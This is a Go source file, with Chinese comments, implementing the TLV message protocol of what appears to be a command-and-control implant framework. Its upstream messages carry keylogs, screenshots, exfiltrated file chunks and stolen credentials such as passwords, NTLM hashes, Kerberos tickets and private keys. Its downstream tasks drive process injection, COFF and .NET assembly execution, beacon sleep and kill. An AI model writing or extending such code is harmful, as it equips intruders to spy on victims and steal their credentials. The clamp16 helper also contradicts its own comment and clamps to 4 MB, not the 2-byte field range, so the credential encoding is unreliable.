// csdev :: proto/tlv.go  --  协议 v2 TLV 编解码 (docs/protocol_v2.md 第 3 节)
//
// 编码: [2B type][4B len][len 字节 data], 均为网络序 (大端)。
// type 高字节表类别, 低字节表具体项; 承载任意二进制 (文件、COFF、截屏)。
//
// len 字段 2026-09 由 2 字节提升为 4 字节: 原 2 字节上限 65535 无法承载
// 协议第 7 节定义的 CHUNK_SIZE = 512 KB, 分块会被静默截断成低 16 位,
// 导致整条 TLV 流错位 (实测: 截屏分块回传在服务端解析为随机 type)。
package proto

import (
	"encoding/binary"
	"fmt"
)

// MaxTLVData 单条 TLV 的 data 长度上限。
// 现为 4 MB, 足以容纳 512 KB 的文件分块与整张截屏。
const MaxTLVData = 0x400000

// MaxFileChunkData FILE_CHUNK 单条 TLV 可承载的最大文件字节数
// (减去 [4B job_id][4B offset][4B total] 头 12 字节)。
const MaxFileChunkData = MaxTLVData - 12

// 上行 TLV (植入体 → 服务端), 协议 3.1
const (
	TLVHeartbeat  uint16 = 0x1001 // [8B unix_ms]
	TLVResult     uint16 = 0x1002 // RESULT 结构 (见 4.3)
	TLVFileChunk  uint16 = 0x1003 // [4B job_id][4B offset][4B total][bytes]
	TLVProxyUp    uint16 = 0x1004 // [4B chan_id][bytes]
	TLVKeylog     uint16 = 0x1005 // UTF-8 文本
	TLVScreenshot uint16 = 0x1006 // JPEG 字节
	TLVMetaUpdate uint16 = 0x1007 // 同 checkin 的 meta 字符串
	TLVCredential uint16 = 0x1008 // [1B kind][2B user_len][user][2B secret_len][secret][2B source_len][source]
)

// 下行 TLV (服务端 → 植入体), 协议 3.2
const (
	TLVTask      uint16 = 0x2001 // TASK 结构 (见 4.1)
	TLVChunkAck  uint16 = 0x2002 // [4B job_id][4B next_offset]
	TLVProxyDown uint16 = 0x2003 // [4B chan_id][bytes]
	TLVSetSleep  uint16 = 0x2004 // [4B sleep_ms][1B jitter_pct]
	TLVKill      uint16 = 0x2005 // 空
)

// 任务子结构 TLV (协议 4.1 中 INJ_* / INJ_BOF / INJ_ASSEMBLY 的 arg 内层)
const (
	TaskSubPID      uint16 = 0x3001 // INJ_PROC: pid (4B)
	TaskSubMethod   uint16 = 0x3002 // INJ_PROC: method (1B)
	TaskSubPayload  uint16 = 0x3003 // INJ_PROC: payload
	TaskSubArgs     uint16 = 0x3004 // INJ_PROC: args
	TaskSubCOFF     uint16 = 0x3005 // INJ_BOF: coff 字节
	TaskSubArgBlock uint16 = 0x3006 // INJ_BOF: 参数块
	TaskSubEntry    uint16 = 0x3007 // INJ_BOF: 入口名
	TaskSubAssembly uint16 = 0x3008 // INJ_ASSEMBLY: assembly
	TaskSubAsmArgs  uint16 = 0x3009 // INJ_ASSEMBLY: 参数
)

// 凭据 kind 取值。协议 3.1 只规定 kind 为 1 字节、未枚举取值, 以下为服务端约定,
// 待回填协议文档 (见交付说明"契约歧义")。
const (
	CredKindPassword byte = 1 // 明文/可恢复口令
	CredKindHash     byte = 2 // NTLM/SHA 等哈希
	CredKindTicket   byte = 3 // Kerberos 票据
	CredKindKey      byte = 4 // 私钥/证书材料
)

// CredKindName 返回凭据 kind 的可读名。
func CredKindName(kind byte) string {
	switch kind {
	case CredKindPassword:
		return "password"
	case CredKindHash:
		return "hash"
	case CredKindTicket:
		return "ticket"
	case CredKindKey:
		return "key"
	default:
		return fmt.Sprintf("kind-%d", kind)
	}
}

// TLV 一条类型-长度-值项。
type TLV struct {
	Type uint16
	Data []byte
}

// EncodeTLVs 顺序编码多条 TLV。
// data 超过 MaxTLVData 的项会被跳过 (长度字段放不下), 需要严格校验时用 EncodeTLVsChecked。
func EncodeTLVs(items ...TLV) []byte {
	total := 0
	for _, it := range items {
		if len(it.Data) > MaxTLVData {
			continue
		}
		total += 6 + len(it.Data)
	}
	out := make([]byte, 0, total)
	for _, it := range items {
		if len(it.Data) > MaxTLVData {
			continue
		}
		out = appendBE16(out, it.Type)
		out = appendBE32(out, uint32(len(it.Data)))
		out = append(out, it.Data...)
	}
	return out
}

// EncodeTLVsChecked 与 EncodeTLVs 相同, 但任一项超长即返回 error 而非静默跳过。
func EncodeTLVsChecked(items ...TLV) ([]byte, error) {
	for i, it := range items {
		if len(it.Data) > MaxTLVData {
			return nil, fmt.Errorf("proto: TLV[%d] type=0x%04X 的 data %d 字节超出上限 %d",
				i, it.Type, len(it.Data), MaxTLVData)
		}
	}
	return EncodeTLVs(items...), nil
}

// ParseTLVs 解析 TLV 流。任何截断 (头不足 6 字节 / data 长度越界) 都返回 error, 不 panic。
// 返回的 Data 为独立副本, 不与入参共享底层数组。
func ParseTLVs(b []byte) ([]TLV, error) {
	items := make([]TLV, 0, 8)
	for off := 0; off < len(b); {
		if off+6 > len(b) {
			return nil, fmt.Errorf("%w: TLV 头需要 6 字节, 偏移 %d 处仅剩 %d 字节",
				ErrTruncated, off, len(b)-off)
		}
		typ := BE16(b[off : off+2])
		ln := int(BE32(b[off+2 : off+6]))
		off += 6
		if off+ln > len(b) {
			return nil, fmt.Errorf("%w: TLV 0x%04X 声明 %d 字节, 偏移 %d 处仅剩 %d 字节",
				ErrTruncated, typ, ln, off, len(b)-off)
		}
		data := make([]byte, ln)
		copy(data, b[off:off+ln])
		items = append(items, TLV{Type: typ, Data: data})
		off += ln
	}
	return items, nil
}

// FindTLV 返回第一条指定类型的 TLV。
func FindTLV(items []TLV, typ uint16) (TLV, bool) {
	for _, it := range items {
		if it.Type == typ {
			return it, true
		}
	}
	return TLV{}, false
}

// FilterTLV 返回所有指定类型的 TLV (保持原顺序)。
func FilterTLV(items []TLV, typ uint16) []TLV {
	var out []TLV
	for _, it := range items {
		if it.Type == typ {
			out = append(out, it)
		}
	}
	return out
}

// ---------------------------------------------------------------- 字节序小工具
// 读函数在长度不足时返回 0, 写函数在长度不足时静默忽略; 解析路径必须先显式校验长度。

// BE16 从大端字节读 uint16。
func BE16(b []byte) uint16 {
	if len(b) < 2 {
		return 0
	}
	return binary.BigEndian.Uint16(b[:2])
}

// BE32 从大端字节读 uint32。
func BE32(b []byte) uint32 {
	if len(b) < 4 {
		return 0
	}
	return binary.BigEndian.Uint32(b[:4])
}

// PutBE16 写入大端 uint16。
func PutBE16(b []byte, v uint16) {
	if len(b) >= 2 {
		binary.BigEndian.PutUint16(b[:2], v)
	}
}

// PutBE32 写入大端 uint32。
func PutBE32(b []byte, v uint32) {
	if len(b) >= 4 {
		binary.BigEndian.PutUint32(b[:4], v)
	}
}

func appendBE16(b []byte, v uint16) []byte {
	return append(b, byte(v>>8), byte(v))
}

func appendBE32(b []byte, v uint32) []byte {
	return append(b, byte(v>>24), byte(v>>16), byte(v>>8), byte(v))
}

// ---------------------------------------------------------------- 语义结构

// FileChunk 对应上行 FILE_CHUNK (0x1003)。
type FileChunk struct {
	JobID  uint32
	Offset uint32
	Total  uint32
	Data   []byte
}

// ProxyData 对应上行/下行 PROXY_DATA (0x1004 / 0x2003)。
type ProxyData struct {
	ChanID uint32
	Data   []byte
}

// Credential 对应上行 CREDENTIAL (0x1008)。
type Credential struct {
	Kind   byte
	User   string
	Secret string
	Source string
}

// ---------------------------------------------------------------- 上下行编解码

// NewTLVHeartbeat 构造 HEARTBEAT (0x1001)。
func NewTLVHeartbeat(unixMs uint64) TLV {
	d := make([]byte, 8)
	binary.BigEndian.PutUint64(d, unixMs)
	return TLV{Type: TLVHeartbeat, Data: d}
}

// ParseTLVHeartbeat 解析 HEARTBEAT, 返回 unix 毫秒时间戳。
func ParseTLVHeartbeat(t TLV) (uint64, error) {
	if err := expectType(t, TLVHeartbeat, "HEARTBEAT"); err != nil {
		return 0, err
	}
	if len(t.Data) < 8 {
		return 0, fmt.Errorf("%w: HEARTBEAT 需要 8 字节, 实际 %d", ErrTruncated, len(t.Data))
	}
	return binary.BigEndian.Uint64(t.Data[:8]), nil
}

// NewTLVResult 构造 RESULT (0x1002), data 为 4.3 的 RESULT 结构。
func NewTLVResult(r *Result) TLV {
	return TLV{Type: TLVResult, Data: r.Encode()}
}

// ParseTLVResult 解析 RESULT。
func ParseTLVResult(t TLV) (*Result, error) {
	if err := expectType(t, TLVResult, "RESULT"); err != nil {
		return nil, err
	}
	return DecodeResult(t.Data)
}

// NewTLVFileChunk 构造 FILE_CHUNK (0x1003)。
// data 超过 MaxFileChunkData 时按上限截断 (调用方应先分片)。
func NewTLVFileChunk(jobID, offset, total uint32, data []byte) TLV {
	if len(data) > MaxFileChunkData {
		data = data[:MaxFileChunkData]
	}
	d := make([]byte, 12+len(data))
	PutBE32(d[0:4], jobID)
	PutBE32(d[4:8], offset)
	PutBE32(d[8:12], total)
	copy(d[12:], data)
	return TLV{Type: TLVFileChunk, Data: d}
}

// ParseTLVFileChunk 解析 FILE_CHUNK。
func ParseTLVFileChunk(t TLV) (*FileChunk, error) {
	if err := expectType(t, TLVFileChunk, "FILE_CHUNK"); err != nil {
		return nil, err
	}
	if len(t.Data) < 12 {
		return nil, fmt.Errorf("%w: FILE_CHUNK 头需要 12 字节, 实际 %d", ErrTruncated, len(t.Data))
	}
	return &FileChunk{
		JobID:  BE32(t.Data[0:4]),
		Offset: BE32(t.Data[4:8]),
		Total:  BE32(t.Data[8:12]),
		Data:   append([]byte(nil), t.Data[12:]...),
	}, nil
}

// NewTLVProxyUp 构造上行 PROXY_DATA (0x1004)。
func NewTLVProxyUp(chanID uint32, data []byte) TLV {
	return TLV{Type: TLVProxyUp, Data: proxyData(chanID, data)}
}

// NewTLVProxyDown 构造下行 PROXY_DATA (0x2003)。
func NewTLVProxyDown(chanID uint32, data []byte) TLV {
	return TLV{Type: TLVProxyDown, Data: proxyData(chanID, data)}
}

// ParseTLVProxy 解析上行或下行 PROXY_DATA。
func ParseTLVProxy(t TLV) (*ProxyData, error) {
	if t.Type != TLVProxyUp && t.Type != TLVProxyDown {
		return nil, fmt.Errorf("proto: 期望 PROXY_DATA (0x%04X/0x%04X), 实际 0x%04X",
			TLVProxyUp, TLVProxyDown, t.Type)
	}
	if len(t.Data) < 4 {
		return nil, fmt.Errorf("%w: PROXY_DATA 需要至少 4 字节 chan_id, 实际 %d", ErrTruncated, len(t.Data))
	}
	return &ProxyData{ChanID: BE32(t.Data[0:4]), Data: append([]byte(nil), t.Data[4:]...)}, nil
}

func proxyData(chanID uint32, data []byte) []byte {
	d := make([]byte, 4+len(data))
	PutBE32(d[0:4], chanID)
	copy(d[4:], data)
	return d
}

// NewTLVKeylog 构造 KEYLOG (0x1005), 载荷为 UTF-8 文本。
func NewTLVKeylog(text string) TLV {
	return TLV{Type: TLVKeylog, Data: []byte(text)}
}

// ParseTLVKeylog 解析 KEYLOG 载荷。
func ParseTLVKeylog(t TLV) (string, error) {
	if err := expectType(t, TLVKeylog, "KEYLOG"); err != nil {
		return "", err
	}
	return string(t.Data), nil
}

// NewTLVScreenshot 构造 SCREEN (0x1006), 载荷为 JPEG 字节。
func NewTLVScreenshot(jpeg []byte) TLV {
	return TLV{Type: TLVScreenshot, Data: jpeg}
}

// ParseTLVScreenshot 解析 SCREEN 载荷。
func ParseTLVScreenshot(t TLV) ([]byte, error) {
	if err := expectType(t, TLVScreenshot, "SCREEN"); err != nil {
		return nil, err
	}
	return append([]byte(nil), t.Data...), nil
}

// NewTLVMetaUpdate 构造 META_UPDATE (0x1007), 格式与 checkin meta 相同。
func NewTLVMetaUpdate(meta []string) TLV {
	return TLV{Type: TLVMetaUpdate, Data: []byte(JoinMeta(meta))}
}

// ParseTLVMetaUpdate 解析 META_UPDATE。
func ParseTLVMetaUpdate(t TLV) ([]string, error) {
	if err := expectType(t, TLVMetaUpdate, "META_UPDATE"); err != nil {
		return nil, err
	}
	return SplitMeta(string(t.Data)), nil
}

// NewTLVCredential 构造 CREDENTIAL (0x1008)。
//
//	[1B kind][2B user_len][user][2B secret_len][secret][2B source_len][source]
func NewTLVCredential(kind byte, user, secret, source string) TLV {
	u, s, src := []byte(user), []byte(secret), []byte(source)
	u, s, src = clamp16(u), clamp16(s), clamp16(src)

	d := make([]byte, 0, 1+2+len(u)+2+len(s)+2+len(src))
	d = append(d, kind)
	d = appendBE16(d, uint16(len(u)))
	d = append(d, u...)
	d = appendBE16(d, uint16(len(s)))
	d = append(d, s...)
	d = appendBE16(d, uint16(len(src)))
	d = append(d, src...)
	return TLV{Type: TLVCredential, Data: d}
}

// ParseTLVCredential 解析 CREDENTIAL。
func ParseTLVCredential(t TLV) (*Credential, error) {
	if err := expectType(t, TLVCredential, "CREDENTIAL"); err != nil {
		return nil, err
	}
	if len(t.Data) < 1+2 {
		return nil, fmt.Errorf("%w: CREDENTIAL 需要至少 3 字节, 实际 %d", ErrTruncated, len(t.Data))
	}
	c := &Credential{Kind: t.Data[0]}
	off := 1
	var err error
	if c.User, off, err = read16(t.Data, off, "user"); err != nil {
		return nil, err
	}
	if c.Secret, off, err = read16(t.Data, off, "secret"); err != nil {
		return nil, err
	}
	if c.Source, off, err = read16(t.Data, off, "source"); err != nil {
		return nil, err
	}
	return c, nil
}

func read16(b []byte, off int, field string) (string, int, error) {
	if off+2 > len(b) {
		return "", off, fmt.Errorf("%w: CREDENTIAL %s 的长度字段越界 (偏移 %d)", ErrTruncated, field, off)
	}
	n := int(BE16(b[off : off+2]))
	off += 2
	if off+n > len(b) {
		return "", off, fmt.Errorf("%w: CREDENTIAL %s 声明 %d 字节, 偏移 %d 处仅剩 %d",
			ErrTruncated, field, n, off, len(b)-off)
	}
	return string(b[off : off+n]), off + n, nil
}

// NewTLVTask 构造下行 TASK (0x2001)。
func NewTLVTask(t *Task) TLV {
	return TLV{Type: TLVTask, Data: t.Encode()}
}

// ParseTLVTask 解析下行 TASK。
func ParseTLVTask(t TLV) (*Task, error) {
	if err := expectType(t, TLVTask, "TASK"); err != nil {
		return nil, err
	}
	return DecodeTask(t.Data)
}

// NewTLVChunkAck 构造下行 CHUNK_ACK (0x2002)。
func NewTLVChunkAck(jobID, nextOffset uint32) TLV {
	d := make([]byte, 8)
	PutBE32(d[0:4], jobID)
	PutBE32(d[4:8], nextOffset)
	return TLV{Type: TLVChunkAck, Data: d}
}

// ParseTLVChunkAck 解析下行 CHUNK_ACK。
func ParseTLVChunkAck(t TLV) (jobID, nextOffset uint32, err error) {
	if err = expectType(t, TLVChunkAck, "CHUNK_ACK"); err != nil {
		return 0, 0, err
	}
	if len(t.Data) != 8 {
		return 0, 0, fmt.Errorf("proto: CHUNK_ACK 需要 8 字节, 实际 %d", len(t.Data))
	}
	return BE32(t.Data[0:4]), BE32(t.Data[4:8]), nil
}

// NewTLVSetSleep 构造下行 SET_SLEEP (0x2004)。
func NewTLVSetSleep(sleepMs uint32, jitterPct byte) TLV {
	d := make([]byte, 5)
	PutBE32(d[0:4], sleepMs)
	d[4] = jitterPct
	return TLV{Type: TLVSetSleep, Data: d}
}

// ParseTLVSetSleep 解析下行 SET_SLEEP。
func ParseTLVSetSleep(t TLV) (sleepMs uint32, jitterPct byte, err error) {
	if err = expectType(t, TLVSetSleep, "SET_SLEEP"); err != nil {
		return 0, 0, err
	}
	if len(t.Data) != 5 {
		return 0, 0, fmt.Errorf("proto: SET_SLEEP 需要 5 字节, 实际 %d", len(t.Data))
	}
	return BE32(t.Data[0:4]), t.Data[4], nil
}

// NewTLVKill 构造下行 KILL (0x2005), 空载荷。
func NewTLVKill() TLV {
	return TLV{Type: TLVKill, Data: nil}
}

// ParseTLVKill 校验下行 KILL。
func ParseTLVKill(t TLV) error {
	if err := expectType(t, TLVKill, "KILL"); err != nil {
		return err
	}
	if len(t.Data) != 0 {
		return fmt.Errorf("proto: KILL 载荷应为空, 实际 %d 字节", len(t.Data))
	}
	return nil
}

// expectType 统一类型不匹配的错误文案。
func expectType(t TLV, want uint16, name string) error {
	if t.Type != want {
		return fmt.Errorf("proto: 期望 %s (0x%04X), 实际 0x%04X", name, want, t.Type)
	}
	return nil
}

// clamp16 把字节切片截断到 2 字节长度字段可表示的范围。
func clamp16(b []byte) []byte {
	if len(b) > MaxTLVData {
		return b[:MaxTLVData]
	}
	return b
}
